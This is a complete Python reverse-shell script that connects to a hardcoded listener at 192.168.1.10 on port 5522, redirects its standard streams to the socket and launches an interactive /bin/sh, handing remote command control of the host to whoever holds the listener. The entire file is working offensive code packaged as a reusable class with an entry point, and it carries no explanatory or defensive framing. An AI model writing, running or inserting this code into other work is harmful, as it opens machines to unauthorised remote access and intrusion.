#!/usr/bin/env python3
"""Connect to a hardcoded listener and bridge it to an interactive shell."""

import os
import socket
import subprocess

__all__ = ["REMOTE_HOST", "REMOTE_PORT", "ReverseShell", "main"]

REMOTE_HOST = "192.168.1.10"
REMOTE_PORT = 5522
SHELL = "/bin/sh"
SHELL_ARGS = ("-i",)


class ReverseShell:
    """Connect to the listener and attach the socket to stdio before exec'ing a shell."""

    def __init__(self, host=REMOTE_HOST, port=REMOTE_PORT, shell=SHELL, shell_args=SHELL_ARGS):
        self.host = host
        self.port = port
        self.shell = shell
        self.shell_args = tuple(shell_args)
        self.sock = None

    def connect(self):
        """Create and connect the TCP socket if it has not been created yet."""
        if self.sock is None:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.host, self.port))
        return self.sock

    def run(self):
        """Connect, redirect standard streams to the socket, and start the shell."""
        sock = self.connect()
        fd = sock.fileno()

        os.dup2(fd, 0)
        os.dup2(fd, 1)
        os.dup2(fd, 2)

        argv = [self.shell, *self.shell_args]
        return subprocess.call(argv)

    def __call__(self):
        return self.run()


def main():
    """Entry point for direct execution."""
    return ReverseShell().run()


if __name__ == "__main__":
    main()
